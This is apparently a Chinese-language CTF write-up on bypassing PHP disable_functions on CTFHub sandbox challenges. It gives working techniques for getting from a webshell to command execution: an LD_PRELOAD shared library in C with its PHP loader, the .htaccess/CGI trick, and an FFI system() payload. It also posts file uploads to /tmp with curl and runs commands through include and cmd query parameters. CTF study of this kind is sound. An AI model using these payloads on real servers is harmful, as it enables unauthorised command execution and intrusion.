---
title: 【WEB】bypass-disable-function
---

# bypass disable_function

是 php 禁用的函数，在 phpinfo 中可以查看

例如禁用 system 函数就无法执行命令，然后我们可以用一下方法饶过他的限制

可用的函数有

```
dl
putenv 
error_reporting
error_log
file_put_contents
file_get_contents
fopen
fclose 
fwrite
tempnam 
imap_open
symlink
curl_init
fsockopen
```

利用代码见：http://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions



## 关于文件上传

有些时候需要包含文件，但是又不能访问根目录，以及当前目录没有写权限

我们可以利用自包含的方式传递文件到 /tmp 然后用 var_dump(scandir('/tmp/')) 查看内容，php5 大多数版本可用

例如：

```
curl -F file=@shellshock.php -X POST http://challenge-fc37b0a33351b3a2.sandbox.ctfhub.com:10080/backdoor/index.php?ant=include(%27index.php%27);
```

然后文件就会留在 /tmp 目录,直接包含即可



## LD_PRELOAD

需要用到的条件有

```
Linux 操作系统
putenv
mail or error_log
存在可写的目录, 需要上传 .so 文件
```

用蚁剑插件的话需要当前 shell 目录可写

然后会在当前目录下自动生成这个文件：

```
.antproxy.php
```

之后连接这个文件，密码不变，即可在虚拟终端执行命令

但如果当前目录不可写，可以上传文件至 /tmp，之后包含

首先需要生成 so 文件

test.c ( payload 可替换 )

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
    system("/readflag > /tmp/test");
}   
int  geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

执行命令

```
gcc -c -fPIC test.c -o test
gcc --share test -o test.so
```

将 c 编译成 so 文件

之后上传 shell.php 和 test.so 至 /tmp

shell.php

```
<?php
    putenv("LD_PRELOAD=/tmp/test.so");
    error_log("test",1,"","");
    mail("test@localhost","","","","");
?>
```

之后包含该 shell.php 文件，即可实现命令执行，输出执行 /realflag 的结果到 /tmp/test



## Apache Mod CGI

需要的条件有

```
Linux 操作系统
Apache + PHP (apache 使用 apache_mod_php)
Apache 开启了 cgi, rewrite
Web 目录给了 AllowOverride 权限
网站目录可写
```

也就是说只要是 Apache + PHP 环境就可能存在这个漏洞

蚁剑插件需要 shell 目录可写，然后即可在虚拟终端执行命令

手动的话，就上传 .htaccess 和 shell.ant 文件到网站目录

然后更改 shell.ant 权限为 777

访问 shell.ant 执行命令



## PHP-FPM

简单来说就是访问 FPM 端口，通过 cgi 从而修改 php 文件设置，使已有 php 文件包含自己传入的命令

需要的条件有

```
Linux 操作系统
PHP-FPM
存在可写的目录, 需要上传 .so 文件
```

通常端口是 9000 但有时也不固定

当 shell 目录可写的时候，使用蚁剑插件可以在当前目录生成一个 .antproxy.php 文件

然后连接这个文件，即可操作终端



## Json Serializer UAF

需要的条件有

```
Linux 操作系统
PHP 版本
7.1.X 
7.2 < 7.2.19 
7.3 < 7.3.6
```

蚁剑插件可直接打开虚拟终端执行命令

手动的话，需要上传文件，比如传到 /tmp 目录，然后包含一下，这里我用 curl 没有上传成功，使用了一个上传页面成功上传

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <form action="http://challenge-777ab141ad3bd5be.sandbox.ctfhub.com:10080/?ant=include(%27index.php%27);" method="post" enctype="multipart/form-data">
        <input type="file" name="file" />
        <br>
        <input type="submit" />
</body>
</html>
```

然后包含一下

```
?ant=include('/tmp/phpMnoKON');&cmd=/readflag
```

使用 cmd 参数执行命令



## GC UAF

这个就有点强了，适用于目前 PHP7 绝大部分版本

```
- 7.0 - all versions to date
- 7.1 - all versions to date
- 7.2 - all versions to date
- 7.3 - all versions to date
```

蚁剑插件可直接在虚拟终端执行命令，如果不成功，可以手动上传

上传文件至 /tmp 目录，然后包含，即可利用 cmd 参数执行命令

```
?ant=include('/tmp/exp.php');&cmd=/readflag
```



## FFI

使用条件有

```
Linux 操作系统
PHP >= 7.4
开启了 FFI 扩展且 ffi.enable=true
```

蚁剑插件可直接在虚拟终端执行命令

手动上传的话，上传 FFI_exp.php 到 /tmp 目录，修改 FFI_exp.php 中内容执行命令

FFI_exp.php：

```
<?php
    $ffi = FFI::cdef("int system(const char *command);");
    $ffi->system("/readflag > /tmp/123");
    echo file_get_contents("/tmp/123");
    @unlink("/tmp/123");
?>
```

然后包含

```
?ant=include('/tmp/FFI_exp.php');
```

即可获得 flag